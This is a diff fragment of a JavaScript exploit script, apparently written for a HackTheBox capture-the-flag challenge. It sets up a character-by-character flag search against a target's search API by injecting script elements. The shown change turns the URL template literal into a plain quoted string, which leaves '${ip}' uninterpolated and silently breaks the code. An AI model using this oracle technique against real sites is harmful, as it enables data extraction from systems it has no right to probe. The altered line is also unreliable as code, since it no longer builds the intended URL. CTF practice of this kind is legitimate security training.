@@ -1,7 +1,7 @@
 var ip = '188.166.171.200:30840'; // HTB Server IP Address
 var flag = 'HTB{'; // init search word
 var letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
-var url = `http://${ip}/api/entries/search?q=`;
+var url = 'http://${ip}/api/entries/search?q=';
 async function getLetter(ch){
   return new Promise((resolve, reject)=>{
     const script = document.createElement("script");
